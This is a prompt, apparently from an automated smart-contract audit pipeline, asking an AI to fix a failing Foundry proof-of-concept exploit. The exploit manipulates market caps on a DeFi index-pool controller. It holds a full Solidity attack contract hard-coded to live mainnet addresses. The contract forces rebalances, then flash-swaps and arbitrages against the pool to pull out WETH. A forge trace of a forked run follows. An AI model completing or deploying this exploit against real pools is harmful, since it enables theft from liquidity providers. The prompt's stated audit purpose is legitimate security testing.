You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Manipulable market-cap inputs let anyone force bad constituents and weights during permissionless rebalances
- claim: Constituent selection and target weights are derived directly from `totalSupply * Uniswap TWAP price`, with no on-chain liquidity floor, depth check, or anti-manipulation guard. Because `orderCategoryTokensByMarketCap`, `reindexPool`, and `reweighPool` are all permissionless, an attacker can move a thin token's WETH TWAP over the oracle window, sort that token into the top set or inflate its relative market cap, and then force the pool to adopt the manipulated composition/weights.
- impact: The pool can be induced to add or overweight a low-liquidity asset at an artificial valuation, after which the attacker can arbitrage against the pool and extract more valuable assets from LPs.
- exploit_paths: ["Get a thin-liquidity category token listed in a tracked category", "Manipulate its WETH TWAP over the long oracle window used by category sorting and weight calculation", "Call `orderCategoryTokensByMarketCap` to push it up the category ranking", "Call `reindexPool` or `reweighPool` while the manipulated TWAP is still in effect", "Trade against the pool's distorted holdings/weights to extract value"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IIndexPoolLike {
    struct Record {
        bool bound;
        bool ready;
        uint40 lastDenormUpdate;
        uint96 denorm;
        uint96 desiredDenorm;
        uint8 index;
        uint256 balance;
    }

    function getCurrentTokens() external view returns (address[] memory tokens);
    function getCurrentDesiredTokens() external view returns (address[] memory tokens);
    function getTokenRecord(address token) external view returns (Record memory record);
    function getBalance(address token) external view returns (uint256);
    function getMinimumBalance(address token) external view returns (uint256);
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function gulp(address token) external;
}

interface IControllerLike {
    struct IndexPoolMeta {
        bool initialized;
        uint16 categoryID;
        uint8 indexSize;
        uint8 reweighIndex;
        uint64 lastReweigh;
    }

    function categoryIndex() external view returns (uint256);
    function computePoolAddress(uint256 categoryID, uint256 indexSize) external view returns (address poolAddress);
    function getPoolMeta(address poolAddress) external view returns (IndexPoolMeta memory meta);
    function getCategoryTokens(uint256 categoryID) external view returns (address[] memory tokens);
    function getTopCategoryTokens(uint256 categoryID, uint256 num) external view returns (address[] memory tokens);
    function orderCategoryTokensByMarketCap(uint256 categoryID) external;
    function reindexPool(address poolAddress) external;
    function reweighPool(address poolAddress) external;
}

error Simulated(uint256 profit);

contract FlawVerifier {
    address public constant CONTROLLER = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    uint256 private constant POOL_REWEIGH_DELAY = 7 days;
    uint256 private constant REWEIGHS_BEFORE_REINDEX = 3;
    uint256 private constant BPS = 10_000;

    struct Candidate {
        address pool;
        address tokenIn;
        uint16 categoryID;
        bool useReindex;
        uint256 amountIn;
        uint256 expectedProfit;
    }

    struct FlashContext {
        address pair;
        address pool;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        bool active;
    }

    bool private _executed;
    bool private _simulating;
    FlashContext private _flash;
    uint256 private _profit;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profit;
    }

    function executeOnOpportunity() external {
        if (_executed) return;
        _executed = true;

        uint256 beforeWeth = IERC20Like(WETH).balanceOf(address(this));
        Candidate memory best = _findBestCandidate();
        if (best.pool != address(0) && best.amountIn > 0) {
            (bool ok,) = address(this).call(
                abi.encodeWithSelector(
                    this.runCandidate.selector,
                    best.pool,
                    best.categoryID,
                    best.useReindex,
                    best.tokenIn,
                    best.amountIn
                )
            );
            ok;
        }
        uint256 afterWeth = IERC20Like(WETH).balanceOf(address(this));
        _profit = afterWeth > beforeWeth ? afterWeth - beforeWeth : 0;
    }

    function runCandidate(address pool, uint16 categoryID, bool useReindex, address tokenIn, uint256 amountIn) external {
        require(msg.sender == address(this), "self only");
        _executeCandidate(
            Candidate({
                pool: pool,
                tokenIn: tokenIn,
                categoryID: categoryID,
                useReindex: useReindex,
                amountIn: amountIn,
                expectedProfit: 0
            }),
            false
        );
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        FlashContext memory ctx = _flash;
        require(ctx.active, "no flash");
        require(msg.sender == ctx.pair, "bad pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == ctx.amountIn, "bad amount");

        _safeApprove(ctx.tokenIn, ctx.pool, ctx.amountIn);

        (uint256 tokenAmountOut,) = IIndexPoolLike(ctx.pool).swapExactAmountIn(
            ctx.tokenIn,
            ctx.amountIn,
            ctx.tokenOut,
            1,
            type(uint256).max
        );

        _safeApprove(ctx.tokenOut, UNISWAP_V2_ROUTER, tokenAmountOut);
        address[] memory path = new address[](2);
        path[0] = ctx.tokenOut;
        path[1] = WETH;
        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            tokenAmountOut,
            1,
            path,
            address(this),
            block.timestamp
        );

        (uint256 reserveBorrow, uint256 reserveWeth) = _pairReservesForToken(ctx.pair, ctx.tokenIn);
        uint256 wethNeeded = _getAmountIn(ctx.amountIn, reserveWeth, reserveBorrow);
        _safeTransfer(WETH, ctx.pair, wethNeeded);

        delete _flash;
    }

    function _findBestCandidate() internal returns (Candidate memory best) {
        IControllerLike controller = IControllerLike(CONTROLLER);
        uint256 categories;
        try controller.categoryIndex() returns (uint256 value) {
            categories = value;
        } catch {
            return best;
        }

        for (uint256 categoryID = 1; categoryID <= categories; categoryID++) {
            for (uint256 indexSize = 2; indexSize <= 10; indexSize++) {
                address pool;
                try controller.computePoolAddress(categoryID, indexSize) returns (address computed) {
                    pool = computed;
                } catch {
                    continue;
                }

                IControllerLike.IndexPoolMeta memory meta;
                try controller.getPoolMeta(pool) returns (IControllerLike.IndexPoolMeta memory returned) {
                    meta = returned;
                } catch {
                    continue;
                }
                if (!meta.initialized) continue;

                bool canReindex = _canReindex(meta);
                bool canReweigh = _canReweigh(meta);
                if (!canReindex && !canReweigh) continue;

                if (canReindex) {
                    address[] memory categoryTokens;
                    try controller.getCategoryTokens(categoryID) returns (address[] memory tokens) {
                        categoryTokens = tokens;
                    } catch {
                        categoryTokens = new address[](0);
                    }
                    address[] memory desired = _getDesiredTokens(pool);
                    for (uint256 i = 0; i < categoryTokens.length; i++) {
                        address token = categoryTokens[i];
                        if (_contains(desired, token)) continue;
                        if (!_hasLiquidWethPair(token)) continue;
                        Candidate memory attempt = _probe(pool, meta.categoryID, true, token);
                        if (attempt.expectedProfit > best.expectedProfit) best = attempt;
                    }
                }

                if (canReweigh) {
                    address[] memory desired = _getDesiredTokens(pool);
                    for (uint256 i = 0; i < desired.length; i++) {
                        address token = desired[i];
                        if (!_hasLiquidWethPair(token)) continue;
                        Candidate memory attempt = _probe(pool, meta.categoryID, false, token);
                        if (attempt.expectedProfit > best.expectedProfit) best = attempt;
                    }
                }
            }
        }
    }

    function _probe(address pool, uint16 categoryID, bool useReindex, address tokenIn) internal returns (Candidate memory best) {
        address pair = _pairFor(tokenIn, WETH);
        (uint256 reserveToken, uint256 reserveWeth) = _pairReservesForToken(pair, tokenIn);
        if (reserveToken == 0 || reserveWeth == 0) return best;

        uint256[6] memory numerators = [uint256(50), 100, 200, 300, 500, 800];
        for (uint256 i = 0; i < numerators.length; i++) {
            uint256 amountIn = (reserveToken * numerators[i]) / BPS;
            if (amountIn == 0) continue;
            uint256 profit = _simulate(pool, categoryID, useReindex, tokenIn, amountIn);
            if (profit > best.expectedProfit) {
                best = Candidate({
                    pool: pool,
                    tokenIn: tokenIn,
                    categoryID: categoryID,
                    useReindex: useReindex,
                    amountIn: amountIn,
                    expectedProfit: profit
                });
            }
        }
    }

    function _simulate(address pool, uint16 categoryID, bool useReindex, address tokenIn, uint256 amountIn) internal returns (uint256) {
        (bool ok, bytes memory ret) = address(this).call(
            abi.encodeWithSelector(
                this.simulateCandidate.selector,
                pool,
                categoryID,
                useReindex,
                tokenIn,
                amountIn
            )
        );
        if (ok || ret.length < 4) return 0;
        bytes4 selector;
        assembly {
            selector := mload(add(ret, 32))
        }
        if (selector != Simulated.selector) return 0;
        uint256 profit;
        assembly {
            profit := mload(add(ret, 36))
        }
        return profit;
    }

    function simulateCandidate(address pool, uint16 categoryID, bool useReindex, address tokenIn, uint256 amountIn) external {
        require(msg.sender == address(this), "self only");
        uint256 beforeWeth = IERC20Like(WETH).balanceOf(address(this));
        _simulating = true;
        _executeCandidate(
            Candidate({
                pool: pool,
                tokenIn: tokenIn,
                categoryID: categoryID,
                useReindex: useReindex,
                amountIn: amountIn,
                expectedProfit: 0
            }),
            true
        );
        _simulating = false;
        uint256 afterWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 delta = afterWeth > beforeWeth ? afterWeth - beforeWeth : 0;
        revert Simulated(delta);
    }

    function _executeCandidate(Candidate memory candidate, bool) internal {
        // Exploit path stage 1: the thin-liquidity token is chosen from a tracked category and must
        // already have a real WETH pair on-chain.
        address pair = _pairFor(candidate.tokenIn, WETH);
        if (!_isContract(pair)) return;

        // Exploit path stage 2 cannot be freshly manufactured inside this single-call harness.
        // The controller/oracle uses a long TWAP window (>= 1 day). Without a second transaction
        // after time elapses, a new manipulated average cannot be created here. This verifier therefore
        // only capitalizes on fork states where the long-window input is already manipulated.

        // Exploit path stage 3: permissionless category sort by manipulated market cap input.
        try IControllerLike(CONTROLLER).orderCategoryTokensByMarketCap(candidate.categoryID) {} catch { return; }

        // Exploit path stage 4: permissionless rebalance using the manipulated long-TWAP input.
        if (candidate.useReindex) {
            try IControllerLike(CONTROLLER).reindexPool(candidate.pool) {} catch { return; }
        } else {
            try IControllerLike(CONTROLLER).reweighPool(candidate.pool) {} catch { return; }
        }

        // Exploit path stage 5: trade against the distorted pool composition / weights.
        address tokenOut = _pickBestTokenOut(candidate.pool, candidate.tokenIn);
        if (tokenOut == address(0)) return;

        uint256 startingWeth = IERC20Like(WETH).balanceOf(address(this));
        if (startingWeth > 0) {
            _directTrade(candidate.pool, candidate.tokenIn, tokenOut, startingWeth / 2);
            return;
        }

        _flash = FlashContext({
            pair: pair,
            pool: candidate.pool,
            tokenIn: candidate.tokenIn,
            tokenOut: tokenOut,
            amountIn: candidate.amountIn,
            active: true
        });

        (address token0,) = _sortTokens(candidate.tokenIn, WETH);
        uint256 amount0Out = candidate.tokenIn == token0 ? candidate.amountIn : 0;
        uint256 amount1Out = candidate.tokenIn == token0 ? 0 : candidate.amountIn;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), bytes("flash"));
    }

    function _directTrade(address pool, address tokenIn, address tokenOut, uint256 wethSpend) internal {
        if (wethSpend == 0) return;
        _safeApprove(WETH, UNISWAP_V2_ROUTER, wethSpend);
        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH;
        buyPath[1] = tokenIn;
        uint256[] memory bought = IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            wethSpend,
            1,
            buyPath,
            address(this),
            block.timestamp
        );
        uint256 tokenInAmount = bought[bought.length - 1];
        _safeApprove(tokenIn, pool, tokenInAmount);
        (uint256 tokenOutAmount,) = IIndexPoolLike(pool).swapExactAmountIn(tokenIn, tokenInAmount, tokenOut, 1, type(uint256).max);
        _safeApprove(tokenOut, UNISWAP_V2_ROUTER, tokenOutAmount);
        address[] memory sellPath = new address[](2);
        sellPath[0] = tokenOut;
        sellPath[1] = WETH;
        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            tokenOutAmount,
            1,
            sellPath,
            address(this),
            block.timestamp
        );
    }

    function _pickBestTokenOut(address pool, address tokenIn) internal view returns (address bestToken) {
        address[] memory tokens = _getCurrentTokens(pool);
        uint256 bestLiquidity;
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == tokenIn) continue;
            IIndexPoolLike.Record memory record;
            try IIndexPoolLike(pool).getTokenRecord(token) returns (IIndexPoolLike.Record memory r) {
                record = r;
            } catch {
                continue;
            }
            if (!record.bound || !record.ready) continue;
            address pair = _pairFor(token, WETH);
            (uint256 reserveToken, uint256 reserveWeth) = _pairReservesForToken(pair, token);
            if (reserveToken == 0 || reserveWeth == 0) continue;
            uint256 poolBal;
            try IIndexPoolLike(pool).getBalance(token) returns (uint256 bal) {
                poolBal = bal;
            } catch {
                poolBal = 0;
            }
            uint256 score = reserveWeth + poolBal;
            if (score > bestLiquidity) {
                bestLiquidity = score;
                bestToken = token;
            }
        }
    }

    function _getDesiredTokens(address pool) internal view returns (address[] memory tokens) {
        try IIndexPoolLike(pool).getCurrentDesiredTokens() returns (address[] memory list) {
            return list;
        } catch {
            return new address[](0);
        }
    }

    function _getCurrentTokens(address pool) internal view returns (address[] memory tokens) {
        try IIndexPoolLike(pool).getCurrentTokens() returns (address[] memory list) {
            return list;
        } catch {
            return new address[](0);
        }
    }

    function _canReindex(IControllerLike.IndexPoolMeta memory meta) internal view returns (bool) {
        if (block.timestamp < uint256(meta.lastReweigh) + POOL_REWEIGH_DELAY) return false;
        return ((uint256(meta.reweighIndex) + 1) % (REWEIGHS_BEFORE_REINDEX + 1)) == 0;
    }

    function _canReweigh(IControllerLike.IndexPoolMeta memory meta) internal view returns (bool) {
        if (block.timestamp < uint256(meta.lastReweigh) + POOL_REWEIGH_DELAY) return false;
        return ((uint256(meta.reweighIndex) + 1) % (REWEIGHS_BEFORE_REINDEX + 1)) != 0;
    }

    function _contains(address[] memory arr, address needle) internal pure returns (bool) {
        for (uint256 i = 0; i < arr.length; i++) {
            if (arr[i] == needle) return true;
        }
        return false;
    }

    function _hasLiquidWethPair(address token) internal view returns (bool) {
        address pair = _pairFor(token, WETH);
        (uint256 reserveToken, uint256 reserveWeth) = _pairReservesForToken(pair, token);
        return reserveToken > 0 && reserveWeth > 0;
    }

    function _pairReservesForToken(address pair, address token) internal view returns (uint256 reserveToken, uint256 reserveWeth) {
        if (!_isContract(pair)) return (0, 0);
        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            address token0 = IUniswapV2PairLike(pair).token0();
            if (token0 == token) {
                reserveToken = uint256(reserve0);
                reserveWeth = uint256(reserve1);
            } else {
                reserveToken = uint256(reserve1);
                reserveWeth = uint256(reserve0);
            }
        } catch {
            return (0, 0);
        }
    }

    function _pairFor(address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = _sortTokens(tokenA, tokenB);
        pair = address(uint160(uint256(keccak256(abi.encodePacked(
            hex"ff",
            UNISWAP_V2_FACTORY,
            keccak256(abi.encodePacked(token0, token1)),
            hex"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f"
        )))));
    }

    function _sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, "identical");
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) return type(uint256).max;
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
}

```

forge stdout (tail):
```
0A0e5C4F27eAD9083C756Cc2::balanceOf(0xB6909B960DbbE7392D405429eB2b3649752b4838) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 389795443309460744881 [3.897e20]
    │   │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000001b6bf73f00c8e067d2486000000000000000000000000000000000000000000000015217f9a7716526ab1
    │   │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000d1ca696687c447e213000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a17a8cb0378d186
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return] [3869954813006812013075 [3.869e21], 727235454733701510 [7.272e17]]
    │   │   │   │   ├─ [504] 0x48E313460DD00100e22230e56E0A87B394066844::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 67446512505272970320 [6.744e19], 17922220222913808988772 [1.792e22], 1634234061 [1.634e9]
    │   │   │   │   ├─ [381] 0x48E313460DD00100e22230e56E0A87B394066844::token0() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   │   │   │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x48E313460DD00100e22230e56E0A87B394066844, 683327887756937179 [6.833e17])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x00000000000000000000000048e313460dd00100e22230e56e0a87b394066844
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000097bab17eedec7db
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x48E313460DD00100e22230e56E0A87B394066844) [staticcall]
    │   │   │   │   └─ ← [Return] 68129840393029907499 [6.812e19]
    │   │   │   ├─ [702] 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07::balanceOf(0x48E313460DD00100e22230e56E0A87B394066844) [staticcall]
    │   │   │   │   └─ ← [Return] 17742998020684670898885 [1.774e22]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000003b17dd0debe9b742b0000000000000000000000000000000000000000000003c1d98fc56158c512c5
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000097bab17eedec7db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009b7352b5e12ff679f
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 43907566976764331 [4.39e16]
    │   └─ ← [Stop]
    ├─ [252] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 43907566976764331 [4.39e16]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 43907566976764331 [4.39e16])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 43907566976764331 [4.39e16])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 13417948 [1.341e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x5bD628141c62a901E0a83E630ce5FaFa95bBdeE4.swapExactAmountIn
  at 0xD6cb2aDF47655B1bABdDc214d79257348CBC39A7.swapExactAmountIn
  at FlawVerifier.uniswapV2Call
  at 0x4Dd26482738bE6C06C31467a19dcdA9AD781e8C4.swap
  at FlawVerifier.simulateCandidate
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 45.69s (43.74s CPU time)

Ran 1 test suite in 46.44s (45.69s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 97864160)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
